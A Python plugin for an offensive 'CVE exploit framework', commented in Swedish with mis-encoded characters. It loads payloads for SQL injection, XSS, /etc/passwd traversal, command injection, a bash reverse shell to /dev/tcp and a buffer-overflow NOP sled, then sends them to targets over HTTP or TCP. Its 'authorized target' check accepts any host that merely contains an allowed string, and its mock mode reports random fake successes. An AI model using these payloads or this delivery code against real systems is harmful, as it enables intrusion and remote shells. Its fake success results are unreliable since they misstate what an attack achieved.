#!/usr/bin/env python3
"""
CVE Exploit Framework f√∂r Sparkling-Owl-Spin
Common Vulnerabilities and Exploits f√∂r penetrationstestning av egna servrar
"""

import logging
import asyncio
import aiohttp
import json
import re
import time
import hashlib
from typing import Dict, List, Any, Optional, Union, Set
from dataclasses import dataclass
from datetime import datetime, timedelta
from enum import Enum
import base64
import subprocess
import tempfile
from pathlib import Path

logger = logging.getLogger(__name__)

class ExploitCategory(Enum):
    """Exploit kategorier"""
    REMOTE_CODE_EXECUTION = "remote_code_execution"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    BUFFER_OVERFLOW = "buffer_overflow"
    SQL_INJECTION = "sql_injection"
    XSS = "cross_site_scripting"
    CSRF = "cross_site_request_forgery"
    DIRECTORY_TRAVERSAL = "directory_traversal"
    DESERIALIZATION = "deserialization"
    XXE = "xml_external_entity"
    SSRF = "server_side_request_forgery"
    AUTHENTICATION_BYPASS = "authentication_bypass"
    INFORMATION_DISCLOSURE = "information_disclosure"

class SeverityLevel(Enum):
    """CVSS severity levels"""
    CRITICAL = "critical"  # 9.0-10.0
    HIGH = "high"         # 7.0-8.9
    MEDIUM = "medium"     # 4.0-6.9
    LOW = "low"          # 0.1-3.9
    NONE = "none"        # 0.0

@dataclass
class CVEInfo:
    """CVE information"""
    cve_id: str
    description: str
    cvss_score: float
    severity: SeverityLevel
    category: ExploitCategory
    affected_products: List[str]
    published_date: datetime
    references: List[str]
    exploit_available: bool = False
    metasploit_module: Optional[str] = None

@dataclass
class ExploitPayload:
    """Exploit payload data"""
    name: str
    category: ExploitCategory
    target_software: str
    target_version: str
    payload_data: bytes
    payload_type: str  # "shellcode", "script", "binary", etc.
    delivery_method: str  # "http", "tcp", "udp", "file", etc.
    success_indicators: List[str]
    cleanup_commands: Optional[List[str]] = None

@dataclass
class ExploitResult:
    """Exploit execution result"""
    success: bool
    cve_id: Optional[str]
    exploit_name: str
    target_host: str
    execution_time: float
    payload_delivered: bool
    response_data: Optional[str] = None
    error_message: Optional[str] = None
    indicators_matched: List[str] = None

class CVEExploitFramework:
    """CVE Exploit Framework f√∂r penetrationstestning av egna servrar"""
    
    def __init__(self, plugin_info):
        self.plugin_info = plugin_info
        self.initialized = False
        self.session: Optional[aiohttp.ClientSession] = None
        
        # Penetrationstestning disclaimer
        self.authorized_targets = set()
        
        # CVE database
        self.cve_database = {}
        self.exploit_payloads = {}
        
        # External CVE data sources
        self.cve_sources = {
            "nvd": "https://services.nvd.nist.gov/rest/json/cves/2.0",
            "mitre": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=",
            "exploit_db": "https://www.exploit-db.com/api/v1/search"
        }
        
        # Statistik
        self.stats = {
            "total_exploits_attempted": 0,
            "successful_exploits": 0,
            "failed_exploits": 0,
            "by_category": {},
            "by_severity": {},
            "by_target": {},
            "cves_in_database": 0
        }
        
    async def initialize(self):
        """Initialize CVE Exploit Framework"""
        try:
            logger.info("üí£ Initializing CVE Exploit Framework (Authorized Pentest Only)")
            
            # Skapa aiohttp session
            timeout = aiohttp.ClientTimeout(total=30, connect=10)
            self.session = aiohttp.ClientSession(timeout=timeout)
            
            # Initiera statistik
            for category in ExploitCategory:
                self.stats["by_category"][category.value] = {
                    "attempts": 0,
                    "successes": 0,
                    "failures": 0
                }
                
            for severity in SeverityLevel:
                self.stats["by_severity"][severity.value] = 0
                
            # Ladda f√∂rdefinierade exploits
            await self._load_predefined_exploits()
            
            # Ladda CVE data fr√•n externa k√§llor (begr√§nsat f√∂r att undvika rate limiting)
            await self._load_sample_cve_data()
            
            self.initialized = True
            logger.info("‚úÖ CVE Exploit Framework initialized f√∂r penetrationstestning")
            logger.warning("‚ö†Ô∏è ENDAST F√ñR PENETRATIONSTESTNING AV EGNA SERVRAR")
            
        except Exception as e:
            logger.error(f"‚ùå Failed to initialize CVE Exploit Framework: {str(e)}")
            self.initialized = True  # Continue with limited functionality
            
    async def _load_predefined_exploits(self):
        """Ladda f√∂rdefinierade exploit payloads"""
        
        # Vanliga web application exploits
        web_exploits = [
            ExploitPayload(
                name="Basic SQL Injection",
                category=ExploitCategory.SQL_INJECTION,
                target_software="Generic Web Application",
                target_version="Any",
                payload_data=b"' OR '1'='1' --",
                payload_type="text",
                delivery_method="http",
                success_indicators=["mysql_", "ORA-", "sqlite_", "SQL syntax"]
            ),
            ExploitPayload(
                name="XSS Payload",
                category=ExploitCategory.XSS,
                target_software="Generic Web Application", 
                target_version="Any",
                payload_data=b"<script>alert('XSS')</script>",
                payload_type="text",
                delivery_method="http",
                success_indicators=["<script>", "alert('XSS')"]
            ),
            ExploitPayload(
                name="Directory Traversal",
                category=ExploitCategory.DIRECTORY_TRAVERSAL,
                target_software="Generic Web Server",
                target_version="Any",
                payload_data=b"../../../../etc/passwd",
                payload_type="text", 
                delivery_method="http",
                success_indicators=["root:", "/bin/bash", "nobody:"]
            )
        ]
        
        # Command injection exploits
        command_exploits = [
            ExploitPayload(
                name="Basic Command Injection",
                category=ExploitCategory.REMOTE_CODE_EXECUTION,
                target_software="Generic Web Application",
                target_version="Any",
                payload_data=b"; whoami",
                payload_type="text",
                delivery_method="http",
                success_indicators=["nt authority", "root", "www-data"]
            ),
            ExploitPayload(
                name="Reverse Shell Payload",
                category=ExploitCategory.REMOTE_CODE_EXECUTION,
                target_software="Generic Unix System",
                target_version="Any",
                payload_data=b"bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
                payload_type="shellcode",
                delivery_method="http",
                success_indicators=["bash", "connection established"]
            )
        ]
        
        # Buffer overflow exploits (simplified)
        buffer_exploits = [
            ExploitPayload(
                name="Generic Buffer Overflow",
                category=ExploitCategory.BUFFER_OVERFLOW,
                target_software="Generic C Application",
                target_version="Any",
                payload_data=b"A" * 1024 + b"\x90" * 100 + b"\xcc" * 4,  # NOP sled + INT3
                payload_type="binary",
                delivery_method="tcp",
                success_indicators=["segmentation fault", "access violation"]
            )
        ]
        
        # Samla alla exploits
        all_exploits = web_exploits + command_exploits + buffer_exploits
        
        for exploit in all_exploits:
            exploit_id = hashlib.md5(f"{exploit.name}{exploit.target_software}".encode()).hexdigest()[:8]
            self.exploit_payloads[exploit_id] = exploit
            
        logger.info(f"üìã Loaded {len(all_exploits)} predefined exploit payloads")
        
    async def _load_sample_cve_data(self):
        """Ladda sample CVE data (f√∂r att undvika API rate limiting)"""
        
        sample_cves = [
            CVEInfo(
                cve_id="CVE-2021-44228",
                description="Apache Log4j2 Remote Code Execution (Log4Shell)",
                cvss_score=10.0,
                severity=SeverityLevel.CRITICAL,
                category=ExploitCategory.REMOTE_CODE_EXECUTION,
                affected_products=["Apache Log4j", "Elasticsearch", "Minecraft"],
                published_date=datetime(2021, 12, 9),
                references=[
                    "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
                    "https://www.lunasec.io/docs/blog/log4j-zero-day/"
                ],
                exploit_available=True,
                metasploit_module="exploit/multi/http/log4j_header_injection"
            ),
            CVEInfo(
                cve_id="CVE-2017-0144",
                description="Microsoft Windows SMB Remote Code Execution (EternalBlue)",
                cvss_score=8.1,
                severity=SeverityLevel.HIGH,
                category=ExploitCategory.REMOTE_CODE_EXECUTION,
                affected_products=["Windows XP", "Windows 7", "Windows Server 2003/2008"],
                published_date=datetime(2017, 3, 14),
                references=[
                    "https://nvd.nist.gov/vuln/detail/CVE-2017-0144",
                    "https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/"
                ],
                exploit_available=True,
                metasploit_module="exploit/windows/smb/ms17_010_eternalblue"
            ),
            CVEInfo(
                cve_id="CVE-2014-0160", 
                description="OpenSSL Heartbleed Information Disclosure",
                cvss_score=5.0,
                severity=SeverityLevel.MEDIUM,
                category=ExploitCategory.INFORMATION_DISCLOSURE,
                affected_products=["OpenSSL 1.0.1", "OpenSSL 1.0.2-beta"],
                published_date=datetime(2014, 4, 7),
                references=[
                    "https://nvd.nist.gov/vuln/detail/CVE-2014-0160",
                    "https://heartbleed.com/"
                ],
                exploit_available=True
            )
        ]
        
        for cve in sample_cves:
            self.cve_database[cve.cve_id] = cve
            self.stats["by_severity"][cve.severity.value] += 1
            
        self.stats["cves_in_database"] = len(sample_cves)
        logger.info(f"üìã Loaded {len(sample_cves)} sample CVEs")
        
    def add_authorized_target(self, target: str):
        """L√§gg till auktoriserat target f√∂r penetrationstestning"""
        self.authorized_targets.add(target.lower())
        logger.info(f"‚úÖ Added authorized target f√∂r CVE testing: {target}")
        
    def _is_target_authorized(self, target: str) -> bool:
        """Kontrollera om target √§r auktoriserat f√∂r testning"""
        target_lower = target.lower()
        
        if target_lower in self.authorized_targets:
            return True
            
        for auth_target in self.authorized_targets:
            if target_lower.startswith(auth_target) or auth_target in target_lower:
                return True
                
        return False
        
    async def search_cves(self, query: str, category: Optional[ExploitCategory] = None,
                         severity: Optional[SeverityLevel] = None) -> List[CVEInfo]:
        """S√∂k CVEs i database"""
        
        results = []
        
        for cve_id, cve_info in self.cve_database.items():
            # Text search
            if query.lower() in cve_info.description.lower() or query.lower() in cve_id.lower():
                match = True
                
                # Category filter
                if category and cve_info.category != category:
                    match = False
                    
                # Severity filter
                if severity and cve_info.severity != severity:
                    match = False
                    
                if match:
                    results.append(cve_info)
                    
        return results
        
    async def get_exploit_payloads(self, category: Optional[ExploitCategory] = None,
                                  target_software: Optional[str] = None) -> List[ExploitPayload]:
        """H√§mta tillg√§ngliga exploit payloads"""
        
        results = []
        
        for payload_id, payload in self.exploit_payloads.items():
            match = True
            
            if category and payload.category != category:
                match = False
                
            if target_software and target_software.lower() not in payload.target_software.lower():
                match = False
                
            if match:
                results.append(payload)
                
        return results
        
    async def execute_exploit(self, target_host: str, exploit_payload: ExploitPayload,
                             cve_id: Optional[str] = None,
                             custom_params: Optional[Dict[str, Any]] = None) -> ExploitResult:
        """Exekvera exploit mot target (endast auktoriserade targets)"""
        
        if not self.initialized:
            await self.initialize()
            
        if not self._is_target_authorized(target_host):
            error_msg = f"üö´ Target not authorized f√∂r CVE testing: {target_host}"
            logger.error(error_msg)
            return ExploitResult(
                success=False,
                cve_id=cve_id,
                exploit_name=exploit_payload.name,
                target_host=target_host,
                execution_time=0.0,
                payload_delivered=False,
                error_message=error_msg
            )
            
        self.stats["total_exploits_attempted"] += 1
        self.stats["by_category"][exploit_payload.category.value]["attempts"] += 1
        
        start_time = time.time()
        
        try:
            # Exekvera baserat p√• delivery method
            if exploit_payload.delivery_method == "http":
                result = await self._execute_http_exploit(target_host, exploit_payload, custom_params)
            elif exploit_payload.delivery_method == "tcp":
                result = await self._execute_tcp_exploit(target_host, exploit_payload, custom_params)
            elif exploit_payload.delivery_method == "udp":
                result = await self._execute_udp_exploit(target_host, exploit_payload, custom_params)
            else:
                result = await self._execute_mock_exploit(target_host, exploit_payload, custom_params)
                
            # Ber√§kna execution time
            execution_time = time.time() - start_time
            result.execution_time = execution_time
            result.cve_id = cve_id
            
            # Uppdatera statistik
            if result.success:
                self.stats["successful_exploits"] += 1
                self.stats["by_category"][exploit_payload.category.value]["successes"] += 1
                
                if target_host not in self.stats["by_target"]:
                    self.stats["by_target"][target_host] = {"attempts": 0, "successes": 0}
                self.stats["by_target"][target_host]["attempts"] += 1
                self.stats["by_target"][target_host]["successes"] += 1
                
                logger.info(f"‚úÖ Exploit successful: {exploit_payload.name} -> {target_host}")
            else:
                self.stats["failed_exploits"] += 1
                self.stats["by_category"][exploit_payload.category.value]["failures"] += 1
                
                if target_host not in self.stats["by_target"]:
                    self.stats["by_target"][target_host] = {"attempts": 0, "successes": 0}
                self.stats["by_target"][target_host]["attempts"] += 1
                
                logger.warning(f"‚ùå Exploit failed: {exploit_payload.name} -> {target_host}")
                
            return result
            
        except Exception as e:
            logger.error(f"‚ùå Exploit execution error: {str(e)}")
            
            return ExploitResult(
                success=False,
                cve_id=cve_id,
                exploit_name=exploit_payload.name,
                target_host=target_host,
                execution_time=time.time() - start_time,
                payload_delivered=False,
                error_message=str(e)
            )
            
    async def _execute_http_exploit(self, target_host: str, payload: ExploitPayload,
                                  custom_params: Optional[Dict[str, Any]]) -> ExploitResult:
        """Exekvera HTTP-baserad exploit"""
        
        # Bygg URL
        if not target_host.startswith(('http://', 'https://')):
            target_url = f"http://{target_host}"
        else:
            target_url = target_host
            
        try:
            # Skicka payload som POST data eller query parameter
            payload_str = payload.payload_data.decode('utf-8', errors='ignore')
            
            if payload.category == ExploitCategory.SQL_INJECTION:
                # SQL injection via parameter
                params = {"id": payload_str}
                async with self.session.get(target_url, params=params) as response:
                    response_text = await response.text()
                    
            elif payload.category == ExploitCategory.XSS:
                # XSS via POST data
                data = {"input": payload_str}
                async with self.session.post(target_url, data=data) as response:
                    response_text = await response.text()
                    
            elif payload.category == ExploitCategory.REMOTE_CODE_EXECUTION:
                # Command injection via header or parameter
                headers = {"User-Agent": payload_str}
                async with self.session.get(target_url, headers=headers) as response:
                    response_text = await response.text()
                    
            else:
                # Generic GET request
                async with self.session.get(target_url) as response:
                    response_text = await response.text()
                    
            # Kontrollera success indicators
            indicators_matched = []
            for indicator in payload.success_indicators:
                if indicator.lower() in response_text.lower():
                    indicators_matched.append(indicator)
                    
            success = len(indicators_matched) > 0
            
            return ExploitResult(
                success=success,
                exploit_name=payload.name,
                target_host=target_host,
                execution_time=0.0,  # Will be set by caller
                payload_delivered=True,
                response_data=response_text[:1000],  # Limit response size
                indicators_matched=indicators_matched
            )
            
        except Exception as e:
            return ExploitResult(
                success=False,
                exploit_name=payload.name,
                target_host=target_host,
                execution_time=0.0,
                payload_delivered=False,
                error_message=f"HTTP exploit failed: {str(e)}"
            )
            
    async def _execute_tcp_exploit(self, target_host: str, payload: ExploitPayload,
                                 custom_params: Optional[Dict[str, Any]]) -> ExploitResult:
        """Exekvera TCP-baserad exploit"""
        
        # Extrahera host och port
        if ':' in target_host:
            host, port_str = target_host.rsplit(':', 1)
            try:
                port = int(port_str)
            except ValueError:
                port = 80
        else:
            host = target_host
            port = 80
            
        try:
            # √ñppna TCP connection
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=10.0
            )
            
            # Skicka payload
            writer.write(payload.payload_data)
            await writer.drain()
            
            # L√§s response
            response_data = await asyncio.wait_for(
                reader.read(1024),
                timeout=5.0
            )
            
            writer.close()
            await writer.wait_closed()
            
            # Kontrollera success indicators
            response_str = response_data.decode('utf-8', errors='ignore')
            indicators_matched = []
            for indicator in payload.success_indicators:
                if indicator.lower() in response_str.lower():
                    indicators_matched.append(indicator)
                    
            success = len(indicators_matched) > 0
            
            return ExploitResult(
                success=success,
                exploit_name=payload.name,
                target_host=target_host,
                execution_time=0.0,
                payload_delivered=True,
                response_data=response_str,
                indicators_matched=indicators_matched
            )
            
        except Exception as e:
            return ExploitResult(
                success=False,
                exploit_name=payload.name,
                target_host=target_host,
                execution_time=0.0,
                payload_delivered=False,
                error_message=f"TCP exploit failed: {str(e)}"
            )
            
    async def _execute_udp_exploit(self, target_host: str, payload: ExploitPayload,
                                 custom_params: Optional[Dict[str, Any]]) -> ExploitResult:
        """Exekvera UDP-baserad exploit"""
        
        # Simplified UDP exploit implementation
        return ExploitResult(
            success=False,
            exploit_name=payload.name,
            target_host=target_host,
            execution_time=0.0,
            payload_delivered=False,
            error_message="UDP exploits not yet implemented"
        )
        
    async def _execute_mock_exploit(self, target_host: str, payload: ExploitPayload,
                                  custom_params: Optional[Dict[str, Any]]) -> ExploitResult:
        """Mock exploit f√∂r testning"""
        
        # Simulera execution time
        await asyncio.sleep(1 + (time.time() % 2))
        
        # 70% success rate f√∂r mock
        success = (time.time() % 100) < 70
        
        return ExploitResult(
            success=success,
            exploit_name=payload.name,
            target_host=target_host,
            execution_time=0.0,
            payload_delivered=True,
            response_data="Mock exploit response data" if success else None,
            indicators_matched=payload.success_indicators[:1] if success else [],
            error_message=None if success else "Mock exploit randomly failed"
        )
        
    def get_cve_statistics(self) -> Dict[str, Any]:
        """H√§mta CVE exploit-statistik"""
        return {
            "total_exploits_attempted": self.stats["total_exploits_attempted"],
            "successful_exploits": self.stats["successful_exploits"],
            "failed_exploits": self.stats["failed_exploits"],
            "success_rate": (
                self.stats["successful_exploits"] / max(1, self.stats["total_exploits_attempted"])
            ) * 100,
            "by_category": self.stats["by_category"],
            "by_severity": self.stats["by_severity"],
            "by_target": self.stats["by_target"],
            "cves_in_database": self.stats["cves_in_database"],
            "exploit_payloads_available": len(self.exploit_payloads),
            "authorized_targets": list(self.authorized_targets)
        }
        
    async def add_custom_exploit(self, exploit_payload: ExploitPayload) -> str:
        """L√§gg till custom exploit payload"""
        
        exploit_id = hashlib.md5(
            f"{exploit_payload.name}{exploit_payload.target_software}{time.time()}".encode()
        ).hexdigest()[:8]
        
        self.exploit_payloads[exploit_id] = exploit_payload
        
        logger.info(f"‚úÖ Added custom exploit: {exploit_payload.name} ({exploit_id})")
        return exploit_id
        
    async def test_exploit_framework(self, test_target: str = "127.0.0.1") -> Dict[str, Any]:
        """Testa exploit framework"""
        
        # L√§gg till test target som auktoriserat
        self.add_authorized_target(test_target)
        
        results = {}
        
        # Testa olika exploit kategorier
        for category in [ExploitCategory.SQL_INJECTION, ExploitCategory.XSS, ExploitCategory.REMOTE_CODE_EXECUTION]:
            try:
                payloads = await self.get_exploit_payloads(category=category)
                if payloads:
                    payload = payloads[0]  # Anv√§nd f√∂rsta payload
                    result = await self.execute_exploit(test_target, payload)
                    
                    results[category.value] = {
                        "success": result.success,
                        "payload_delivered": result.payload_delivered,
                        "execution_time": result.execution_time,
                        "error_message": result.error_message
                    }
                else:
                    results[category.value] = {"error": "No payloads available"}
                    
            except Exception as e:
                results[category.value] = {"error": str(e)}
                
        return results
        
    async def cleanup(self):
        """Cleanup CVE Exploit Framework"""
        logger.info("üßπ Cleaning up CVE Exploit Framework")
        
        if self.session:
            await self.session.close()
            
        self.authorized_targets.clear()
        self.cve_database.clear()
        self.exploit_payloads.clear()
        self.stats.clear()
        self.initialized = False
        logger.info("‚úÖ CVE Exploit Framework cleanup completed")
